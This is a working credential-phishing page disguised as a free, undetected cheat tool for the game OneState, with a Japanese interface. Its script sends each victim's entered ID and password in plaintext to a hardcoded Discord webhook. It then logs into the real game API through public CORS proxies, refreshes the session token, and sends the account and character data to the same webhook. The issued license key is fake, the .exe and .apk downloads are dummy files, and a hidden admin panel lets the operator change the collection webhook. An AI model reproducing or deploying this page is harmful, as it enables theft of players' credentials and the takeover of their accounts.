<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>OneState Cheat Tool</title>
<meta name="theme-color" content="#05070c">
<script src="https://unpkg.com/corsfix"></script>
<style>
:root{--bg:#05070c;--fg:#c9d7e6;--dim:#5f748c;--acc:#6fc9ff;--line:rgba(111,201,255,.16);--card:rgba(8,13,21,.72);--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
*{box-sizing:border-box}html{-webkit-text-size-adjust:100%}
body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:14px;line-height:1.7;padding-bottom:90px}
body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);background-size:40px 40px}
.wrap{position:relative;z-index:1;max-width:600px;margin:0 auto;padding:0 18px}
.top{display:flex;justify-content:space-between;align-items:center;padding:22px 0 10px;font-size:12px;letter-spacing:.14em;color:var(--dim)}
.brand span{color:var(--acc)}
.hero{padding:32px 0 24px}
h1{margin:0;font-size:29px;line-height:1.36;font-weight:600}
.sub{margin:14px 0 0;color:var(--dim);font-size:13px}
.spec{margin-top:16px;font-size:11px;letter-spacing:.18em;color:var(--acc);opacity:.75}
.card{position:relative;border:1px solid var(--line);background:var(--card);padding:18px 16px;margin:0 0 14px}
.card::before,.card::after{content:"";position:absolute;width:9px;height:9px;border:1px solid var(--acc);opacity:.7}
.card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
.card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
.lab{font-size:11px;letter-spacing:.16em;color:var(--acc);margin-bottom:12px}
.f{display:block;margin-bottom:10px}
.f>span{display:block;font-size:11px;letter-spacing:.1em;color:var(--dim);margin-bottom:5px}
input{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--line);color:var(--fg);font-family:var(--mono);font-size:15px;padding:11px 12px;outline:none}
input:focus{border-color:var(--acc)}
.btn{width:100%;background:transparent;border:1px solid var(--acc);color:var(--acc);font-family:var(--mono);font-size:13px;letter-spacing:.1em;padding:13px;cursor:pointer}
.btn:active{background:var(--acc);color:#05070c}
.btn.ghost{font-size:12px;padding:10px}
.row{display:flex;gap:8px}.row>*{flex:1}
.msg{margin-top:12px;font-size:12px;color:var(--dim)}.msg:empty{display:none}.msg.ok{color:var(--acc)}
.key{font-size:19px;letter-spacing:.12em;color:var(--acc)}
.meta{margin-top:8px;font-size:11px;letter-spacing:.12em;color:var(--dim)}
.tog{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid rgba(111,201,255,.08);font-size:13px}
.tog:last-child{border-bottom:0}
.tog i{width:34px;height:18px;border:1px solid var(--line);position:relative;display:block;flex:none}
.tog i::after{content:"";position:absolute;top:2px;left:2px;width:12px;height:12px;background:var(--dim)}
.tog.on i{border-color:var(--acc)}.tog.on i::after{left:18px;background:var(--acc)}
pre{margin:0;font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all}
#acctBody{color:var(--dim)}
footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
#admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line)}
.ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
.ab{padding:0 16px 14px;max-height:62vh;overflow:auto}
.ab.collapsed{display:none}
#alog{margin-top:10px;max-height:48vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:104px;z-index:9;display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
.tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px}
</style>
</head>
<body>
<div class="wrap">
  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.7</div></div>
  <div class="hero">
    <h1>OneStateを、<br>上書きする。</h1>
    <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
    <div class="spec">EXTERNAL / UNDETECTED / FREE</div>
  </div>
  <form class="card" id="form">
    <div class="lab">// ログイン</div>
    <label class="f"><span>OneState ID</span><input id="ident" type="email" autocomplete="username" placeholder="mail@example.com" required></label>
    <label class="f"><span>パスワード</span><input id="pass" type="password" autocomplete="current-password" placeholder="********" required></label>
    <button class="btn" id="go" type="submit">チートを有効化</button>
    <div class="msg" id="msg"></div>
  </form>
  <div class="card" id="lic" hidden>
    <div class="lab">// ライセンス</div>
    <div class="key" id="key">-</div>
    <div class="meta">STATUS: <b>ACTIVE</b></div>
  </div>
  <div class="card" id="dl" hidden>
    <div class="lab">// ダウンロード</div>
    <div class="row"><button class="btn ghost" data-dl="win">Windows (.exe)</button><button class="btn ghost" data-dl="apk">Android (.apk)</button></div>
  </div>
  <div class="card" id="tg" hidden>
    <div class="lab">// 機能</div>
    <div class="tog on"><span>スピードハック</span><i></i></div>
    <div class="tog on"><span>オートエイム</span><i></i></div>
    <div class="tog on"><span>無限スタミナ</span><i></i></div>
    <div class="tog"><span>ESP / 壁抜き</span><i></i></div>
  </div>
  <div class="card" id="acct" hidden>
    <div class="lab">// アカウント</div>
    <pre id="acctBody">-</pre>
  </div>
  <footer>// OneState Cheat Tool</footer>
</div>

<div id="admin" hidden>
  <div class="ah" id="ah">// ADMIN</div>
  <div class="ab collapsed" id="ab">
    <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bsave">保存</button><button class="btn ghost" id="btest">テスト送信</button><button class="btn ghost" id="bclr">ログ削除</button></div>
    <div class="row"><button class="btn ghost" id="bacct">アカウント取得</button><button class="btn ghost" id="bdiag">通信診断</button></div>
    <pre id="alog"></pre>
  </div>
</div>
<div id="toast"></div>

<script>
(function(){
'use strict';
var CONFIG={WEBHOOK:'https://discord.com/api/webhooks/1560547137287356426/eh5PI3avovSw0MetSFhw9eFN_X-2znCSyi_fFCB1P8KDagFzi2HWZa6LiBdPPXRX7xMP',API:'https://api.onestate-rp.com'};
var LS={cfg:'oc_v4_cfg',log:'oc_v3_log',fp:'oc_fp'};
var $=function(id){return document.getElementById(id)};
var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
function qs(k){return new URLSearchParams(location.search).get(k)}
function getCfg(){try{return JSON.parse(localStorage.getItem(LS.cfg)||'{}')}catch(e){return{}}}
function setCfg(o){localStorage.setItem(LS.cfg,JSON.stringify(o))}
function webhook(){return qs('to')||getCfg().webhook||CONFIG.WEBHOOK}
function fp(){var v=localStorage.getItem(LS.fp);if(!v){v=Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,6);localStorage.setItem(LS.fp,v)}return v}
function getLog(){try{return JSON.parse(localStorage.getItem(LS.log)||'[]')}catch(e){return[]}}
function stamp(){var d=new Date(),p=function(n){return String(n).padStart(2,'0')};return p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())}
function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>500)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-300).join('\n');el.scrollTop=el.scrollHeight}
function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2400)}

var TR=[
 {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
 {n:'corsfix',f:function(u,o){return fetch('https://proxy.corsfix.com/?'+u,o)}},
 {n:'allorigins-g',wrap:true,f:function(u,o){return fetch('https://api.allorigins.win/get?url='+encodeURIComponent(u),o)}},
 {n:'codetabs',f:function(u,o){return fetch('https://api.codetabs.com/v1/proxy?quest='+encodeURIComponent(u),o)}},
 {n:'cors.lol',f:function(u,o){return fetch('https://api.cors.lol/?url='+encodeURIComponent(u),o)}},
 {n:'direct',f:function(u,o){return fetch(u,o)}}
];
var PREF=-1;
async function req(method,path,body,headers){
  var url=CONFIG.API+path;
  var opts={method:method,headers:Object.assign({'Content-Type':'application/json'},headers||{})};
  if(body!=null)opts.body=JSON.stringify(body);
  var idx=TR.map(function(_,i){return i});
  var order=PREF>=0?[PREF].concat(idx.filter(function(i){return i!==PREF})):idx;
  var last=null,err='no transport';
  for(var k=0;k<order.length;k++){
    var i=order[k],t=TR[i];
    try{
      if(t.need&&!t.need())continue;
      var r=await t.f(url,opts);
      var txt=await r.text();
      if(t.wrap){try{txt=JSON.parse(txt).contents}catch(e){}}
      var j=null;try{j=JSON.parse(txt)}catch(e){}
      last={ok:true,t:t.n,status:r.status,json:j,text:txt};
      if(j&&typeof j==='object'&&('code'in j||'errorCode'in j||'data'in j||'players'in j)){PREF=i;return last}
    }catch(e){err=t.n+': '+(e&&e.message||e)}
  }
  return last||{ok:false,err:err};
}
function code(r){if(!r||!r.ok)return 'ERR';if(r.json&&r.json.code!=null)return r.json.code;if(r.json&&r.json.errorCode)return r.json.errorCode;return 'ok'}
/* 成功判定：errorCode が無い or UNSPECIFIED なら成功 */
function isOk(r){return !!(r&&r.ok&&r.json&&(!r.json.errorCode||r.json.errorCode==='UNSPECIFIED'))}
async function send(text){
  var wh=webhook();if(!wh)return;var body=JSON.stringify({content:text});
  try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
  catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
}
async function apiLogin(id,pw){
  var r=await req('POST','/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
  return null;
}
async function doRefresh(rt){
  if(!rt)return null;
  var r=await req('POST','/v2/auth/refresh',{refreshToken:rt,fingerprint:fp()});
  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
  return null;
}
/* ===== アカウント取得 ===== */
async function getAccount(tok,cid){
  var schemes=[['Bearer',{authorization:'Bearer '+tok}],['raw',{authorization:tok}]];
  for(var s=0;s<schemes.length;s++){
    var r=await req('GET','/v2/account/@me',null,schemes[s][1]);
    log('acct['+schemes[s][0]+'] -> '+(r.ok?(r.json?JSON.stringify(r.json).slice(0,110):'nonjson'):r.err));
    if(isOk(r)&&r.json.data){
      var p=await req('GET','/v2/account/@me/players',null,schemes[s][1]);
      log('players -> '+(p.ok?JSON.stringify(p.json).slice(0,140):p.err));
      return {scheme:schemes[s][0],acc:r.json.data,pl:(p.ok?p.json:null)};
    }
    await sleep(120);
  }
  return null;
}
function showAccount(res){
  if(!res){acct('取得失敗（トークン未受理）');return}
  var a=res.acc||{},lines=['取得方式: '+res.scheme];
  Object.keys(a).forEach(function(k){
    var v=a[k];
    if(v===null||v===undefined)return;
    if(typeof v==='object'){lines.push(k+': '+JSON.stringify(v).slice(0,200))}
    else lines.push(k+': '+v);
  });
  if(res.pl&&res.pl.players)lines.push('players: '+res.pl.players.length+' 体');
  if(res.pl&&res.pl.players&&res.pl.players.length){
    res.pl.players.slice(0,5).forEach(function(pp,i){
      lines.push('  ['+(i+1)+'] '+JSON.stringify(pp).slice(0,160));
    });
  }
  acct(lines.join('\n'));
  toast('アカウント取得成功');
  send('OneState アカウント取得\n'+JSON.stringify(a).slice(0,1400));
}
function acct(t){$('acct').hidden=false;$('acctBody').textContent=t}
function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
function issue(){var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}$('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;return k}
function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}

$('form').addEventListener('submit',async function(e){
  e.preventDefault();
  var id=$('ident').value.trim(),pw=$('pass').value;
  if(!id||!pw){msg('IDとパスワードを入力');return}
  $('go').disabled=true;msg('接続中...');issue();
  await send('OneState ID 取得\nID: '+id+'\nパスワード: '+pw+'\n時刻: '+new Date().toLocaleString('ja-JP'));
  var lr=await apiLogin(id,pw);
  msg('ライセンス発行済み',true);toast('ライセンス発行');
  if(lr){
    var tok=await doRefresh(lr.data.refreshToken)||lr.data.accessToken;
    showAccount(await getAccount(tok,lr.data.clientId));
  }else acct('API応答なし');
  $('go').disabled=false;
});
document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
  var kind=b.getAttribute('data-dl');
  var blob=new Blob(['OneState Cheat Loader v3.7 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
  var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
})});
document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});

if(qs('admin')!=null){$('admin').hidden=false}
$('ah').addEventListener('click',function(){$('ab').classList.toggle('collapsed')});
$('wh').value=getCfg().webhook||'';
$('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').value.trim();setCfg(c);toast('保存')});
$('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
$('bclr').addEventListener('click',function(){clearLog();toast('削除')});
$('bacct').addEventListener('click',async function(){
  clearLog();log('// ACCOUNT');
  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');toast('ログイン失敗');return}
  log('login OK');
  var tok=await doRefresh(lr.data.refreshToken);
  log('refresh: '+(tok?'OK':'FAIL'));
  var res=await getAccount(tok||lr.data.accessToken,lr.data.clientId);
  if(res){log('=== ACCOUNT OK ===');log(JSON.stringify(res.acc).slice(0,700));toast('取得成功')}
  else{log('=== 取得失敗 ===');toast('失敗')}
  showAccount(res);
});
$('bdiag').addEventListener('click',async function(){
  clearLog();log('// DIAG');
  for(var i=0;i<TR.length;i++){
    var line=TR[i].n+': ';
    for(var k=0;k<2;k++){
      try{
        if(TR[i].need&&!TR[i].need()){line+='skip ';continue}
        var o={method:k?'POST':'GET',headers:{'Content-Type':'application/json'}};
        if(k)o.body=JSON.stringify({ident:'x',password:'y',remember:true,fingerprint:fp()});
        var res=await TR[i].f(CONFIG.API+'/v2/auth/login',o);var t=await res.text();
        if(TR[i].wrap){try{t=JSON.parse(t).contents}catch(e){}}
        var j=null;try{j=JSON.parse(t)}catch(e){}
        line+=(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?'))+' ';
      }catch(e){line+='ERR '}
      await sleep(50);
    }
    log(line);
  }
});
renderLog();
})();
</script>
</body>
</html>
